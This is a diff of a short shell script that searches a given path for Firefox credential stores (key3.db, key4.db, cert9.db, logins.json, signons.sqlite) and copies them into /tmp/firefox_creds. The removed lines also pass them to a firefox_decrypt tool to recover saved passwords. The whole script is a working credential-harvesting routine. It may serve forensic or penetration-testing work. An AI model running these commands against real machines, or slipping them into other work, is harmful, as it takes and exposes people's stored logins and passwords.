@@ -1,12 +1,9 @@
-mkdir firefox_creds
+mkdir /tmp/firefox_creds
 
-find . -name "key3.db" -exec cp {} firefox_creds/ \;
-find . -name "key4.db" -exec cp {} firefox_creds/ \;
-find . -name "cert9.db" -exec cp {} firefox_creds/ \;
-find . -name "logins.json" -exec cp {} firefox_creds/ \;
-find . -name "signons.sqlite" -exec cp {} firefox_creds/ \;
+find $1 -name "key3.db" -exec cp {} /tmp/firefox_creds/ \;
+find $1 -name "key4.db" -exec cp {} /tmp/firefox_creds/ \;
+find $1 -name "cert9.db" -exec cp {} /tmp/firefox_creds/ \;
+find $1 -name "logins.json" -exec cp {} /tmp/firefox_creds/ \;
+find $1 -name "signons.sqlite" -exec cp {} /tmp/firefox_creds/ \;
 
-ls firefox_creds -hAl
-
-/opt/firefox_decrypt/firefox_decrypt.py firefox_creds/
-
+ls /tmp/firefox_creds -hAl
